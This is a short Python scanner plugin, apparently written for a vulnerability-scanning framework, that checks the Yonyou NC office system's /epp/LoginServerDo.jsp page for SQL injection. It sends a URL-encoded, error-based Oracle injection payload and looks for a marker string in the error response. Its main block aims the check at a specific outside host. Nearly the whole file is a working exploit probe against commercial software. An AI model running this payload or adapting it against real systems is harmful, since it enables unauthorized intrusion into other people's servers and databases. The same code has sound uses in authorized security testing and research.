#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 用友nc综合办公系统 /epp/LoginServerDo.jsp sql注入

#Refer:http://www.wooyun.org//bugs/wooyun-2010-094565
#Data:2016/2/19

def assign(service, arg):
    if service == "yonyou_nc":
        return True, arg    

def audit(arg):
    vun_url= arg+"epp/LoginServerDo.jsp?pwd=2222&userid=1111"
    payload="%27%20AND%205449%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7Cchr%28116%29%7C%7Cchr%28101%29%7C%7Cchr%28115%29%7C%7Cchr%28116%29%7C%7Cchr%2895%29%7C%7Cchr%28118%29%7C%7Cchr%28117%29%7C%7Cchr%28108%29%29%29%20FROM%20DUAL%29%20AND%20%27CCKn%27%3D%27CCKn"
    code, head, res, errcode, _ = curl.curl2(vun_url+payload)
    #print res
    if code==500 and "test_vul" in res:
        security_hole(' sql injection:'+vun_url)
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('yonyou_nc','http://zfkg.com:8081/')[1])